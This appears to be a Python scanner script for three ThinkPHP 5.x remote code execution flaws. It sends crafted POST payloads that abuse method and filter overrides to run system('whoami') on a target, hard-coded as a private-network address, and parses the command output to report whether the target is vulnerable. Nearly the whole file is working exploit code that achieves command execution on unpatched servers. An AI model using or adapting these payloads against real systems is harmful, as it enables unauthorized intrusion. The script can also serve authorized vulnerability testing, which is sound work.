import urllib3
import re



def check5010(url):
    http = urllib3.PoolManager()
    r = http.request("POST",url+"/public/index.php?s=index/index/index/",fields={"s":"whoami","filter[]":"system","_method":"__construct","method":""})
    result = re.search(r"(?<=\"echo\">).*?(?=</div>)",str(r.data),re.S)
    if result:
        user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
        if user:
            print(url,"5010 Vulnerable",user)
        else:
            print(url,"5010 Not Vulnerable")
    else:
        print(url,"5010 Not Vulnerable")

def check5023(url):
    http = urllib3.PoolManager()
    r = http.request("POST",url+"/public/index.php?s=captcha",fields={"server[REQUEST_METHOD]":"whoami","filter[]":"system","_method":"__construct","method":"get"})
    result = re.search(r"(?<=\"echo\">).*?(?=</div>)",str(r.data),re.S)
    user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
    if result:
        if user:
            print(url,"5023 Vulnerable",user)
        else:
            print(url,"5023 Not Vulnerable")
    else:
        print(url,"5023 Not Vulnerable")

def check5152(url):
    http = urllib3.PoolManager()
    r = http.request("POST",url+"/public/index.php",fields={"a":"system","b":"whoami","_method":"filter"})
    result = re.search(r".*?(?=<style)",str(r.data),re.S)
    user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
    if result:
        if user:
            print(url,"5152 Vulnerable",user)
        else:
            print(url,"5152 Not Vulnerable")
    else:
        print(url,"5152 Not Vulnerable")

if __name__ == "__main__":
    urls = ["http://10.67.9.24/tp5132/"]
    for url in urls:
        try:
            check5010(url)
            check5023(url)
            check5152(url)
        except Exception as e:
            print(e)
